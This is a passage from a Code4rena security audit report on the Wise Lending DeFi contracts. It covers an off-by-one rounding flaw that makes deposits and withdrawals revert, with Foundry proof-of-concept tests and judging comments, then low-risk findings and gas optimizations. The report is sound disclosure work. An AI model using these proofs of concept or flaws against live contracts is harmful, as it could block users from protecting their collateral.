    - The `calculateLendingShares()` function now calls `_calculateShares()` on [L26](https://github.com/code-423n4/2024-02-wise-lending/blob/main/contracts/MainHelper.sol#L26).
    - [`_calculateShares()` decreases the calculated shares](https://github.com/code-423n4/2024-02-wise-lending/blob/main/contracts/MainHelper.sol#L44) by `1` which is represented by the variable `lendingPoolData[_poolToken].totalDepositShares` inside [`_getSharePrice()`](https://github.com/code-423n4/2024-02-wise-lending/blob/main/contracts/WiseLending.sol#L187).
    - The `_getSharePrice()` functions uses this `lendingPoolData[_poolToken].totalDepositShares` variable in the denominator on [L185-187](https://github.com/code-423n4/2024-02-wise-lending/blob/main/contracts/WiseLending.sol#L185-L187) and in many cases, returns an increased value (in this case it evaluates to `1000000000000000001`) which is captured in the variable `lendSharePriceAfter` inside [`_compareSharePrices()`](https://github.com/code-423n4/2024-02-wise-lending/blob/main/contracts/WiseLending.sol#L219).
3. Circling back to our first step, this causes the validation to fail on [L234-L237](https://github.com/code-423n4/2024-02-wise-lending/blob/main/contracts/WiseLending.sol#L234-L237) inside `_compareSharePrices()` since the `lendSharePriceAfter` is now greater than `currentSharePriceMax` i.e. `1000000000000000001 > 1000000000000000000`. Hence, the transaction reverts.

The [reduction by 1 inside `_calculateShares()`](https://github.com/code-423n4/2024-02-wise-lending/blob/main/contracts/MainHelper.sol#L44) is done by the protocol in its own favour to safeguard itself. The `lendingPoolData[_poolToken].pseudoTotalPool`; however, is never modified. This mismatch eventually reaches a significant divergence, and is the root cause of these reverts.

See:
- The last comment inside the `Proof of Concept-2 (Withdraw scenario)` section later in the report.
- `Option1` inside the `Recommended Mitigation Steps` section later in the report.

<details>

```js
  File: contracts/WiseLending.sol

  97:               modifier syncPool(
  98:                   address _poolToken
  99:               ) {
  100:                  (
  101:                      uint256 lendSharePrice,
  102:                      uint256 borrowSharePrice
  103:                  ) = _syncPoolBeforeCodeExecution(
  104:                      _poolToken
  105:                  );
  106:          
  107:                  _;
  108:          
  109: @--->            _syncPoolAfterCodeExecution(
  110:                      _poolToken,
  111:                      lendSharePrice,
  112:                      borrowSharePrice
  113:                  );
  114:              }
```

```js
  File: contracts/WiseLending.sol

  308:              function _syncPoolAfterCodeExecution(
  309:                  address _poolToken,
  310:                  uint256 _lendSharePriceBefore,
  311:                  uint256 _borrowSharePriceBefore
  312:              )
  313:                  private
  314:              {
  315:                  _newBorrowRate(
  316:                      _poolToken
  317:                  );
  318:          
  319: @--->            _compareSharePrices(
  320:                      _poolToken,
  321:                      _lendSharePriceBefore,
  322:                      _borrowSharePriceBefore
  323:                  );
  324:              }
```

```js
  File: contracts/WiseLending.sol

  388:              function depositExactAmountETH(
  389:                  uint256 _nftId
  390:              )
  391:                  external
  392:                  payable
  393:                  syncPool(WETH_ADDRESS)
  394:                  returns (uint256)
  395:              {
  396: @--->            return _depositExactAmountETH(
  397:                      _nftId
  398:                  );
  399:              }
  400:          
  401:              function _depositExactAmountETH(
  402:                  uint256 _nftId
  403:              )
  404:                  private
  405:                  returns (uint256)
  406:              {
  407: @--->            uint256 shareAmount = _handleDeposit(
  408:                      msg.sender,
  409:                      _nftId,
  410:                      WETH_ADDRESS,
  411:                      msg.value
  412:                  );
  413:          
  414:                  _wrapETH(
  415:                      msg.value
  416:                  );
  417:          
  418:                  return shareAmount;
  419:              }
```

```js
  File: contracts/WiseCore.sol

  106:              function _handleDeposit(
  107:                  address _caller,
  108:                  uint256 _nftId,
  109:                  address _poolToken,
  110:                  uint256 _amount
  111:              )
  112:                  internal
  113:                  returns (uint256)
  114:              {
  115: @--->            uint256 shareAmount = calculateLendingShares(
  116:                      {
  117:                          _poolToken: _poolToken,
  118:                          _amount: _amount,
  119: @--->                    _maxSharePrice: false
  120:                      }
  121:                  );
  122:          
```

```js
  File: contracts/MainHelper.sol

  17:               function calculateLendingShares(
  18:                   address _poolToken,
  19:                   uint256 _amount,
  20:                   bool _maxSharePrice
  21:               )
  22:                   public
  23:                   view
  24:                   returns (uint256)
  25:               {
  26:  @--->            return _calculateShares(
  27:                       lendingPoolData[_poolToken].totalDepositShares * _amount,
  28:                       lendingPoolData[_poolToken].pseudoTotalPool,
  29:                       _maxSharePrice
  30:                   );
  31:               }
  32:           
  33:               function _calculateShares(
  34:                   uint256 _product,
  35:                   uint256 _pseudo,
  36:                   bool _maxSharePrice
  37:               )
  38:                   private
  39:                   pure
  40:                   returns (uint256)
  41:               {
  42:                   return _maxSharePrice == true
  43:                       ? _product / _pseudo + 1
  44:  @--->                : _product / _pseudo - 1;
  45:               }
```

```js
  File: contracts/WiseLending.sol

  210:              function _compareSharePrices(
  211:                  address _poolToken,
  212:                  uint256 _lendSharePriceBefore,
  213:                  uint256 _borrowSharePriceBefore
  214:              )
  215:                  private
  216:                  view
  217:              {
  218:                  (
  219: @--->                uint256 lendSharePriceAfter,
  220:                      uint256 borrowSharePriceAfter
  221: @--->            ) = _getSharePrice(
  222:                      _poolToken
  223:                  );
  224:          
  225:                  uint256 currentSharePriceMax = _getCurrentSharePriceMax(
  226:                      _poolToken
  227:                  );
  228:          
  229:                  _validateParameter(
  230:                      _lendSharePriceBefore,
  231:                      lendSharePriceAfter
  232:                  );
  233:          
  234:                  _validateParameter(
  235: @--->                lendSharePriceAfter,
  236:                      currentSharePriceMax
  237:                  );
  238:          
  239:                  _validateParameter(
  240:                      _borrowSharePriceBefore,
  241:                      currentSharePriceMax
  242:                  );
  243:          
  244:                  _validateParameter(
  245:                      borrowSharePriceAfter,
  246:                      _borrowSharePriceBefore
  247:                  );
  248:              }
```

```js
  File: contracts/WiseLending.sol

  165:              function _getSharePrice(
  166:                  address _poolToken
  167:              )
  168:                  private
  169:                  view
  170:                  returns (
  171:                      uint256,
  172:                      uint256
  173:                  )
  174:              {
  175:                  uint256 borrowSharePrice = borrowPoolData[_poolToken].pseudoTotalBorrowAmount
  176:                      * PRECISION_FACTOR_E18
  177:                      / borrowPoolData[_poolToken].totalBorrowShares;
  178:          
  179:                  _validateParameter(
  180:                      MIN_BORROW_SHARE_PRICE,
  181:                      borrowSharePrice
  182:                  );
  183:          
  184:                  return (
  185:                      lendingPoolData[_poolToken].pseudoTotalPool
  186:                          * PRECISION_FACTOR_E18
  187: @--->                    / lendingPoolData[_poolToken].totalDepositShares,
  188:                      borrowSharePrice
  189:                  );
  190:              }
```

</details>

### Proof of Concept 

**Deposit scenario:**

Add the following tests inside `contracts/WisenLendingShutdown.t.sol` and run via `forge test --fork-url mainnet -vvvv --mt test_t0x1c_DepositsRevert` to see the tests fail.

```js
    function test_t0x1c_DepositsRevert_Simple() 
        public
    {
        uint256 nftId;
        nftId = POSITION_NFTS_INSTANCE.mintPosition(); 
        LENDING_INSTANCE.depositExactAmountETH{value: 1 ether}(nftId); // @audit-info : If you want to make the test pass, change this to `2 ether`

        address bob = makeAddr("Bob");
        vm.deal(bob, 10 ether); // give some ETH to Bob
        vm.startPrank(bob);

        uint256 nftId_bob = POSITION_NFTS_INSTANCE.mintPosition(); 
        LENDING_INSTANCE.depositExactAmountETH{value: 1.5 ether}(nftId_bob); // @audit : REVERTS incorrectly (reverts for numerous values like `0.5 ether`, `1 ether`, `2 ether`, etc.)
    }

    function test_t0x1c_DepositsRevert_With_Borrow() 
        public
    {
        address bob = makeAddr("Bob");
        vm.deal(bob, 10 ether); // give some ETH to Bob
        vm.startPrank(bob);

        uint256 nftId = POSITION_NFTS_INSTANCE.mintPosition(); 
        LENDING_INSTANCE.depositExactAmountETH{value: 1 ether}(nftId); // @audit-info : If you want to make the test pass, change this to `2 ether`

        LENDING_INSTANCE.borrowExactAmountETH(nftId, 0.7 ether);

        LENDING_INSTANCE.depositExactAmountETH{value: 0.5 ether}(nftId); // @audit : REVERTS incorrectly; Bob can't deposit additional collateral to save himself
    }
```

If you want to check with values which make the test pass, change the following line in both the tests and run again:

```diff
-     LENDING_INSTANCE.depositExactAmountETH{value: 1 ether}(nftId); // @audit-info : If you want to make the test pass, change this to `2 ether`
+     LENDING_INSTANCE.depositExactAmountETH{value: 2 ether}(nftId); // @audit-info : If you want to make the test pass, change this to `2 ether`
```

There are numerous combinations which will cause such a "revert" scenario to occur. Just to provide another example:

Four initial deposits are made in either Style1 or Style2:

```
    - Style1:
        - Alice makes 4 deposits of `2.5 ether` each. Total deposits made by Alice = 4 /ast 2.5 ether = 10 ether.
    - Style2:
        - Alice makes a deposit of `2.5 ether`
        - Bob makes a deposit of `2.5 ether`
        - Carol makes a deposit of `2.5 ether`
        - Dan makes a deposit of `2.5 ether`. Total deposits made by 4 users = 4 /ast 2.5 ether = 10 ether.
```

Now, Emily tries to make a deposit of `2.5 ether`. This reverts.

**Withdraw scenario:**

Add the following test inside `contracts/WisenLendingShutdown.t.sol` and run via `forge test --fork-url mainnet -vvvv --mt test_t0x1c_WithdrawRevert` to see the test fail.

```js
    function test_t0x1c_WithdrawRevert() 
        public
    {
        address bob = makeAddr("Bob");
        vm.deal(bob, 100 ether); // give some ETH to Bob
        vm.startPrank(bob);

        uint256 nftId = POSITION_NFTS_INSTANCE.mintPosition(); 
        LENDING_INSTANCE.depositExactAmountETH{value: 10 ether}(nftId); 
        
        LENDING_INSTANCE.withdrawExactAmountETH(nftId, 9.1 ether); // @audit : Reverts incorrectly for all values greater than `9 ether`.
    }
```

If you want to check with values which make the test pass, change the following line of the test case like shown below and run again:

```diff
-     LENDING_INSTANCE.withdrawExactAmountETH(nftId, 9.1 ether); // @audit : Reverts incorrectly for all values greater than `9 ether`.
+     LENDING_INSTANCE.withdrawExactAmountETH(nftId, 9 ether); // @audit : Reverts incorrectly for all values greater than `9 ether`.
```

This failure happened because the moment `lendingPoolData[_poolToken].pseudoTotalPool` and `lendingPoolData[_poolToken].totalDepositShares` go below `1 ether`, their divergence is significant enough to result in `lendSharePrice` being calculated as greater than `1000000000000000000` or `1 ether`:

```js
  lendSharePrice = lendingPoolData[_poolToken].pseudoTotalPool * 1e18 / lendingPoolData[_poolToken].totalDepositShares
```

Which in this case, evaluates to `1000000000000000001`. This brings us back to our root cause of failure. Due to the divergence, `lendSharePrice` of `1000000000000000001` has become greater than `currentSharePriceMax` of `1000000000000000000` and fails the validation on [L234-L237](https://github.com/code-423n4/2024-02-wise-lending/blob/main/contracts/WiseLending.sol#L234-L237) inside `_compareSharePrices()`.

High likelihood, as it's possible for a huge number of value combinations, as shown above.

If user is trying to save his collateral, this is High severity. Otherwise he can try later with modified values making it a Medium severity.

### Tools Used

Foundry

### Recommended Mitigation Steps

Since the [reduction by 1 inside `_calculateShares()`](https://github.com/code-423n4/2024-02-wise-lending/blob/main/contracts/MainHelper.sol#L44) is being done to round-down in favour of the protocol, removing that without a deeper analysis could prove to be risky as it may open up other attack vectors. Still, two points come to mind which can be explored:

- **Option1:** Reducing `lendingPoolData[_poolToken].pseudoTotalPool` too would keep it in sync with `lendingPoolData[_poolToken].totalDepositShares` and will avoid the current issue.

- **Option2:** Not reducing it by 1 seems to solve the immediate problem at hand (needs further impact analysis):

```diff
  File: contracts/MainHelper.sol

  33:               function _calculateShares(
  34:                   uint256 _product,
  35:                   uint256 _pseudo,
  36:                   bool _maxSharePrice
  37:               )
  38:                   private
  39:                   pure
  40:                   returns (uint256)
  41:               {
  42:                   return _maxSharePrice == true
  43:                       ? _product / _pseudo + 1
- 44:                       : _product / _pseudo - 1;
+ 44:                       : _product / _pseudo;
  45:               }
```

### Assessed type

Math

**[vm06007 (Wise Lending) commented](https://github.com/code-423n4/2024-02-wise-lending-findings/issues/27#issuecomment-2002526153):**
 > If you remove `-1` then it opens other attacks, so it is not justified suggestion. To qualify this for a finding I will let @vonMangoldt give his opinion for these details.

**[Trust (judge) decreased severity to Medium and commented](https://github.com/code-423n4/2024-02-wise-lending-findings/issues/27#issuecomment-2021156001):**
 > High quality submission. Likelihood is Low/Med, Impact is Med/High, so Medium is appropriate.

**[t0x1c (warden) commented](https://github.com/code-423n4/2024-02-wise-lending-findings/issues/27#issuecomment-2026692264):**
> > Likelihood is Low/Med
> 
> @Trust - Could you please expand on your reasoning behind this? As I mentioned in the report, the frequency/likelihood at which this happens currently is very high which I supported by various random examples.
>
> To strengthen my case, here are additional example flows of events which cause a revert for Bob when he tries to save his collateral by depositing additional amount. I have even added more actors so that it can mimic a real world scenario even more closely than before.
>
> I am also supplementing Scenario 1 and Scenario 2 (below) of the table with coded PoCs (very similar to the one I already provided in my report), just in case it helps to run it and see the scenario in action. Due to these reasons, I believe the vulnerability should qualify as a `High`. Requesting you to re-assess.
> 
> | #   | Action1 | Action2 | Action3 | Action4 | Action5 |
> |:-----:|:-------:|:-------:|:-------:|:-------:|:-------:|
> | Scenario 1 | Alice deposits 2 ether | Bob deposits 2 ether | Carol deposits 1 ether | Bob borrows 1 ether | Bob deposits 0.5 ether (reverts) |
> | Scenario 2 | Alice deposits 2 ether | Bob deposits 3 ether | Carol deposits 2.5 ether | Bob borrows 2 ether | Bob deposits 1 ether (reverts) |
> 
> <details>
> 
> ```js
>     function test_t0x1c_MultipleDepositsCombinations_Revert_With_Borrow_Scenario1() 
>         public
>     {
>         address alice = makeAddr("Alice");
>         address bob = makeAddr("Bob");
>         address carol = makeAddr("Carol");
>         vm.deal(alice, 10 ether); 
>         vm.deal(bob, 10 ether); 
>         vm.deal(carol, 10 ether); 
> 
>         console.log("Action1");
>         vm.prank(alice);
>         uint256 nftId = POSITION_NFTS_INSTANCE.mintPosition(); 
>         vm.prank(alice);
>         LENDING_INSTANCE.depositExactAmountETH{value: 2 ether}(nftId); 
> 
>         console.log("Action2");
>         vm.prank(bob);
>         uint256 nftId_Bob = POSITION_NFTS_INSTANCE.mintPosition(); 
>         vm.prank(bob);
>         LENDING_INSTANCE.depositExactAmountETH{value: 2 ether}(nftId_Bob); 
>         
>         console.log("Action3");
>         vm.prank(carol);
>         nftId = POSITION_NFTS_INSTANCE.mintPosition(); 
>         vm.prank(carol);
>         LENDING_INSTANCE.depositExactAmountETH{value: 1 ether}(nftId); 
>         
>         console.log("Action4");
>         vm.prank(bob);
>         LENDING_INSTANCE.borrowExactAmountETH(nftId_Bob, 1 ether);
> 
>         console.log("Action5");
>         vm.prank(bob);
>         LENDING_INSTANCE.depositExactAmountETH{value: 0.5 ether}(nftId_Bob); // @audit : REVERTS incorrectly; Bob can't deposit additional collateral to save himself
>     }
> ```
> 
> and
> 
> ```js
>     function test_t0x1c_MultipleDepositsCombinations_Revert_With_Borrow_Scenario2() 
>         public
>     {
>         address alice = makeAddr("Alice");
>         address bob = makeAddr("Bob");
>         address carol = makeAddr("Carol");
>         vm.deal(alice, 10 ether); 
>         vm.deal(bob, 20 ether); 
>         vm.deal(carol, 10 ether); 
> 
>         console.log("Action1");
>         vm.prank(alice);
>         uint256 nftId = POSITION_NFTS_INSTANCE.mintPosition(); 
>         vm.prank(alice);
>         LENDING_INSTANCE.depositExactAmountETH{value: 2 ether}(nftId); 
> 
>         console.log("Action2");
>         vm.prank(bob);
>         uint256 nftId_Bob = POSITION_NFTS_INSTANCE.mintPosition(); 
>         vm.prank(bob);
>         LENDING_INSTANCE.depositExactAmountETH{value: 3 ether}(nftId_Bob); 
>         
>         console.log("Action3");
>         vm.prank(carol);
>         nftId = POSITION_NFTS_INSTANCE.mintPosition(); 
>         vm.prank(carol);
>         LENDING_INSTANCE.depositExactAmountETH{value: 2.5 ether}(nftId); 
> 
>         console.log("Action4");
>         vm.prank(bob);
>         LENDING_INSTANCE.borrowExactAmountETH(nftId_Bob, 2 ether);
> 
>         console.log("Action5");
>         vm.prank(bob);
>         LENDING_INSTANCE.depositExactAmountETH{value: 1 ether}(nftId_Bob); // @audit : REVERTS incorrectly; Bob can't deposit additional collateral to save himself
>     }
> ```
> 
> </details>

**[Trust (judge) commented](https://github.com/code-423n4/2024-02-wise-lending-findings/issues/27#issuecomment-2026835367):**
 > There is a huge number of combinations which would cause a revert, but considering the vast space of uint256 that number is actually small. Eventually, the issue is called by a rounding which is off by one, and is easily fixed in a repeat transaction. High would be an overstatement.

**[Wise Lending commented](https://github.com/code-423n4/2024-02-wise-lending-findings/issues/27#issuecomment-2082925714):**
> Mitigated [here](https://github.com/wise-foundation/lending-audit/commit/ac68b5a93976969d582301fee9f873ecec606df9).

***

# Low Risk and Non-Critical Issues

For this audit, 7 reports were submitted by wardens detailing low risk and non-critical issues. The [report highlighted below](https://github.com/code-423n4/2024-02-wise-lending-findings/issues/230) by **Dup1337** received the top score from the judge.

*The following wardens also submitted reports: [cheatc0d3](https://github.com/code-423n4/2024-02-wise-lending-findings/issues/283), [nonseodion](https://github.com/code-423n4/2024-02-wise-lending-findings/issues/306), [0x11singh99](https://github.com/code-423n4/2024-02-wise-lending-findings/issues/286), [serial-coder](https://github.com/code-423n4/2024-02-wise-lending-findings/issues/262), [shealtielanz](https://github.com/code-423n4/2024-02-wise-lending-findings/issues/216), and [NentoR](https://github.com/code-423n4/2024-02-wise-lending-findings/issues/187).*

|    ID    | Issue  |
| ------ |:--------------------------------------- |
| [01] | Wrong fee amount check doesn't protect against extensive fees |
| [02] | Allowed spread check allows for smaller spread than expected |
| [03] | No validation of token being removed has shares |
| [04] | Opening nonleveraged position in pendle `PowerFarm` is impossible |
| [05] | Adding too much Pendle markets DoSes Pendle `PowerFarm` |
| [06] | Borrow APY calculations don't account for utilization rate |
| [07] | Possible DoSing of Pendle farm via overflow |
| [08] | `exitFarm` doesn´t default the `isAave` flag |

## [01] Wrong fee amount check doesn't protect against extensive fees

Function `PendlePowerFarmToken.depositExactAmount()` checks if position mint fee is not too big by reverting with `TooMuchFee()` error, if `reducedShares == feeShares` evaluates to true. This check is not sufficient, because if `feeShares` are bigger than `reducedShares`, the condition will succeed. Hence, the protection is not sufficient to protect against too big fee.

```javascript
PendlePowerFarmToken.sol
    function depositExactAmount(
//[...]
        uint256 reducedShares = _applyMintFee(
            shares
        );

        uint256 feeShares = shares
            - reducedShares;

        if (feeShares == 0) {
            revert ZeroFee();
        }

        if (reducedShares == feeShares) { // @audit it doesn't concern case when feeShares > reducedShares
            revert TooMuchFee();
        }
```

The check should be changed to `if (reducedShares <= feeShares)`.

## [02] Allowed spread check allows for smaller spread than expected

Allowed spread check allows for smaller spread than expected, because spread percentage is calculated from value after swaps, not before. 

```javascript
        uint256 ethValueBefore = _getTokensInETH(
            ENTRY_ASSET,
            _depositAmount
        );

        (
            uint256 receivedShares
            ,
        ) = IPendleChild(PENDLE_CHILD).depositExactAmount(
            netLpOut
        );

        uint256 ethValueAfter = _getTokensInETH( 
            PENDLE_CHILD,
            receivedShares
        )
            * _allowedSpread // @audit spread is calculated from diminished value
            / PRECISION_FACTOR_E18;

        if (ethValueAfter < ethValueBefore) {
            revert TooMuchValueLost();
        }
```

So, the check is actually if `value ETH after * _allowedSpread >= deposit ETH value`. However, the calculation checks if the spread is actually lower than set by user, because the slippage is applied to already diminished value. For example, let's say that user passes the following:

```
depositAmount = 100
allowedSlippage = 105e16 (5%)
```

So slippage down to `95` should be accepted. However, due to the flipped calculations, the slippage check would look like `95 * 105% < 100 => 99.75 < 100` and would revert, even though it should be accepted.

## [03] No validation of token being removed has shares 

The manual remove function doesn't validate whether the pool being removed has shares. It can organically have shares during the removal either by TX order or already the share is there.

```solidity
Contract: FeeManager.sol

438:     function removePoolTokenManual(
439:         address _poolToken
440:     )
441:         external
442:         onlyMaster
443:     {
444:         uint256 i;
445:         uint256 len = getPoolTokenAddressesLength();
446:         uint256 lastEntry = len - 1;
447:         bool found;
448: 
449:         if (poolTokenAdded[_poolToken] == false) {
450:             revert PoolNotPresent();
451:         }
452: 
453:         while (i < len) {
454: 
455:             if (_poolToken != poolTokenAddresses[i]) {
456: 
457:                 unchecked {
458:                     ++i;
459:                 }
460: 
461:                 continue;
462:             }
463: 
464:             found = true;
465: 
466:             if (i != lastEntry) {
467:                 poolTokenAddresses[i] = poolTokenAddresses[lastEntry];
468:             }
469: 
470:             break;
471:         }
472: 
473:         if (found == true) {
474: 
475:             poolTokenAddresses.pop();
476:             poolTokenAdded[_poolToken] = false;
477: 
478:             emit PoolTokenRemoved(
479:                 _poolToken,
480:                 block.timestamp
481:             );
482: 
483:             return;
484:         }
485: 
486:         revert PoolNotPresent();
487:     }
```

## [04] Opening nonleveraged position in pendle `PowerFarm` is impossible 

If user wants to have <100% exposure it will revert, in case if 1x leverage flash will be `0` and balancer will revert too.

```solidity
Contract: PendlePowerFarm.sol

185:     function _openPosition(
186:         bool _isAave,
187:         uint256 _nftId,
188:         uint256 _initialAmount,
189:         uint256 _leverage,
190:         uint256 _allowedSpread
191:     )
192:         internal
193:     {
194:         if (_leverage > MAX_LEVERAGE) {
195:             revert LeverageTooHigh();
196:         }
197: 
198:         uint256 leveragedAmount = getLeverageAmount(
199:             _initialAmount,
200:             _leverage
201:         );
202: 
203:         if (_notBelowMinDepositAmount(leveragedAmount) == false) {
204:             revert AmountTooSmall();
205:         }
206: 
207:         _executeBalancerFlashLoan(
208:             {
209:                 _nftId: _nftId,
210:                 _flashAmount: leveragedAmount - _initialAmount, // @audit if user wants to have <100% exposure it will revert, in case if 1x leverage flash will be 0 and balancer will revert too
211:                 _initialAmount: _initialAmount,
212:                 _lendingShares: 0,
213:                 _borrowShares: 0,
214:                 _allowedSpread: _allowedSpread,
215:                 _ethBack: false,
216:                 _isAave: _isAave
217:             }
218:         );
219:     }
220: 
```

## [05] Adding too much Pendle markets DoSes Pendle `PowerFarm`

There is no constraint on how many pendle markets can be added:

```javascript
    function addPendleMarket(
        address _pendleMarket,
        string memory _tokenName,
        string memory _symbolName,
        uint16 _maxCardinality
    )
        external
        onlyMaster
    {
// [...]
        activePendleMarkets.push(
            _pendleMarket
        );
// [...]
```

Adding too much doses syncing supply:

```javascript
    function syncAllSupply()
        public
    {
        uint256 i;
        uint256 length = activePendleMarkets.length;

        while (i < length) {
            _syncSupply(
                activePendleMarkets[i]
            );
            unchecked {
                ++i;
            }
        }
    }
```

## [06] Borrow APY calculations don't account for utilization rate

There are 2 functions calculating APY: one calculates borrow APY, one lending APY. So, generally both should yield similar results, that is `lending APY - protocol fees ~= borrowing APY`. However, lending APY includes utilization rate of the pool and APY is adjusted over it, while borrowing APY doesn't account for it, leading to borrowing APY assuming utilization rate is always 100%.

```javascript
    function overallLendingAPY(
        uint256 _nftId
    )
        external
        view
        returns (uint256)
    {
            weightedRate += ethValue
                * getLendingRate(token);

            overallETH += ethValue;

            unchecked {
                ++i;
            }
        }

        return weightedRate
            / overallETH;
```

and `lendingRate()` function: 

```javascript
getLendingRate(
        address _poolToken
    )
        public
        view
        returns (uint256)
    {
        uint256 pseudoTotalPool = WISE_LENDING.getPseudoTotalPool(
            _poolToken
        );

        if (pseudoTotalPool == 0) {
            return 0;
        }

        uint256 adjustedRate = getBorrowRate(_poolToken)
            * (PRECISION_FACTOR_E18 - WISE_LENDING.globalPoolData(_poolToken).poolFee)
            / PRECISION_FACTOR_E18;

        return adjustedRate // @audit pool utilization rate is taken into account
            * WISE_LENDING.getPseudoTotalBorrowAmount(_poolToken)
            / pseudoTotalPool;
    }
```

In comparison, borrow APY is calculated as follows:

```javascript
    function overallBorrowAPY(
        uint256 _nftId
    )
        external
        view
        returns (uint256)
    {
        // [...]

            weightedRate += ethValue
                * getBorrowRate(token); // @audit borrow rate is WISE_LENDING.borrowPoolData(_poolToken).borrowRate storage variable

            overallETH += ethValue;

            unchecked {
                ++i;
            }
        }

        return weightedRate
            / overallETH;
    }
```

So borrow APY doesn't account for utilization rate as lending APY. So it shows that you'll have to pay high fees for borrowing, and you'll get proportionally less for providing value to the protocol.

There is actually yet another function, combining the two above, `overallNetAPY()`, which calculates both lending and borrowing APY, and returns the value combined.

Both functions are not used by the protocol, but it might false information to either offchain clients or external protocols integrating with `WiseLending`.

Additional thing to consider is that Pendle markets can be only added; there is no function to remove them.

## [07] Possible DoSing of Pendle farm via overflow

There are 3 multiplications of big numbers before first division in `PendleChildLpOracle`:

```javascript
function latestAnswer()
        public
        view
        returns (uint256)
    {
        return priceFeedPendleLpOracle.latestAnswer()
            * pendleChildToken.totalLpAssets()
            * PRECISION_FACTOR_E18
            / pendleChildToken.totalSupply()
            / PRECISION_FACTOR_E18;
    }
```

When I put some numbers, we still have a space to grow:

```
> 2**256 / (1e18*1000000e18*1e18)
115792089237316180
```

But either way, the protocol still can use `MathLib.MulDiv` that handles intermediate overflow gracefully in case of black swan events.

## [08] `exitFarm` doesn´t default the `isAave` flag

When the  `exitFarm` is called:

1. The Power Farm NFT is burned,
2. Reserved keys are reset,
3. And available NFT mapping is reserved for the burned one.

However, it doesn't revert the `isAave` mapping to false:

```solidity
Contract: PendlePowerManager.sol

210:     function exitFarm(
211:         uint256 _keyId,
212:         uint256 _allowedSpread,
213:         bool _ethBack 
214:     )
215:         external
216:         updatePools
217:         onlyKeyOwner(_keyId)
218:     {
219:         uint256 wiseLendingNFT = farmingKeys[
220:             _keyId
221:         ];
222: 
223:         delete farmingKeys[
224:             _keyId
225:         ];
226: 
227:         if (reservedKeys[msg.sender] == _keyId) {
228:             reservedKeys[msg.sender] = 0;
229:         } else {
230:             FARMS_NFTS.burnKey(
231:                 _keyId
232:             );
233:         }
234: 
235:         availableNFTs[
236:             ++availableNFTCount
237:         ] = wiseLendingNFT;
238: 
239:         _closingPosition(
240:             isAave[_keyId],//@audit if this remains as True, it will remain true
241:             wiseLendingNFT,
242:             _allowedSpread,
243:             _ethBack
244:         );
245: 
246:         emit FarmExit(
247:             _keyId,
248:             wiseLendingNFT,
249:             _allowedSpread,
250:             block.timestamp
251:         );
252:     }
```

**[Trust (judge) commented](https://github.com/code-423n4/2024-02-wise-lending-findings/issues/230#issuecomment-2022408387):**
 > [02] - not necessarily valid, it depends on sponsor's interpretation of slippage value.<br>
> [04] - NC severity.<br>
> [05] - belongs to analysis report because it is a centralization risk.

***

# Gas Optimizations

For this audit, 6 reports were submitted by wardens detailing gas optimizations. The [report highlighted below](https://github.com/code-423n4/2024-02-wise-lending-findings/issues/248) by **0xAnah** received the top score from the judge.

*The following wardens also submitted reports: [0x11singh99](https://github.com/code-423n4/2024-02-wise-lending-findings/issues/305), [dharma09](https://github.com/code-423n4/2024-02-wise-lending-findings/issues/152), [K42](https://github.com/code-423n4/2024-02-wise-lending-findings/issues/70), [0xhacksmithh](https://github.com/code-423n4/2024-02-wise-lending-findings/issues/272), and [albahaca](https://github.com/code-423n4/2024-02-wise-lending-findings/issues/254).*

Highlighted below are optimizations exclusively targeting state-mutating functions and view/pure functions invoked by state-mutating functions. In the discussion that follows, only runtime gas is emphasized, given its inevitable dominance over deployment gas costs throughout the protocol's lifetime. 

Please be aware that some code snippets may be shortened to conserve space, and certain code snippets may include @audit tags in comments to facilitate issue explanations.

## [G-01] Refactor `PendlePowerFarmController.increaseReservedForCompound()` function to avoid unnecessary copying from storage to memory and vice-versa

https://github.com/code-423n4/2024-02-wise-lending/blob/main/contracts/PowerFarms/PendlePowerFarmController/PendlePowerFarmController.sol#L497-#L524

The `PendlePowerFarmController.increaseReservedForCompound()` function can be refactored to be better gas efficient by avoiding unnecessary copying of values from storage to memory updating the values then copying back to storage. Having to copy from the storage variable `pendleChildCompoundInfo[_pendleMarket]` into a memory variable `childInfo` would mean that every storage slot of `pendleChildCompoundInfo[_pendleMarket]` would be read (even those not needed in the function); which would cost 2100 gas units for every slot read. Then, it has to update the memory variable in the while loop before copying the memory variable into the storage is absolutely gas inefficient.

We can rectify this by making the `childInfo` variable a storage variable, doing this would avoid having copy values from storage to memory since the it is passed by reference also there would be absolutely no need to copy from memory back to storage. The diff below shows how the code should be refactored:

```solidity
file: contracts/PowerFarms/PendlePowerFarmController/PendlePowerFarmController.sol

497:    function increaseReservedForCompound(
498:        address _pendleMarket,
499:        uint256[] calldata _amounts
500:    )
501:        external
502:        onlyChildContract(_pendleMarket)
503:    {
504:        CompoundStruct memory childInfo = pendleChildCompoundInfo[
505:            _pendleMarket
506:        ];
507:
508:        uint256 i;
509:        uint256 length = childInfo.rewardTokens.length;
510:
511:        while (i < length) {
512:            childInfo.reservedForCompound[i] += _amounts[i];
513:            unchecked {
514:                ++i;
515:            }
516:        }
517:
518:        pendleChildCompoundInfo[_pendleMarket] = childInfo;
519:
520:        emit IncreaseReservedForCompound(
521:            _pendleMarket,
522:            _amounts
523:        );
524:    }
```

```diff
diff --git a/contracts/PowerFarms/PendlePowerFarmController/PendlePowerFarmController.sol b/contracts/PowerFarms/PendlePowerFarmController/PendlePowerFarmController.solindex 15cb863..842b94e 100644
--- a/contracts/PowerFarms/PendlePowerFarmController/PendlePowerFarmController.sol
+++ b/contracts/PowerFarms/PendlePowerFarmController/PendlePowerFarmController.sol
@@ -501,7 +501,7 @@ contract PendlePowerFarmController is PendlePowerFarmControllerHelper {
         external
         onlyChildContract(_pendleMarket)
     {
-        CompoundStruct memory childInfo = pendleChildCompoundInfo[
+        CompoundStruct storage childInfo = pendleChildCompoundInfo[
             _pendleMarket
         ];

@@ -515,8 +515,6 @@ contract PendlePowerFarmController is PendlePowerFarmControllerHelper {
             }
         }

-        pendleChildCompoundInfo[_pendleMarket] = childInfo;
-
         emit IncreaseReservedForCompound(
             _pendleMarket,
             _amounts
```

Estimated gas saved: 13672 gas units.

## [G-02] Avoid Reading and writing to state if the value is zero

**Instance 1:**

Refactor `FeeManager.increaseIncentiveA()` to avoid reading or writing to state if `_value` is `0`.

https://github.com/code-423n4/2024-02-wise-lending/blob/main/contracts/FeeManager/FeeManager.sol#L220

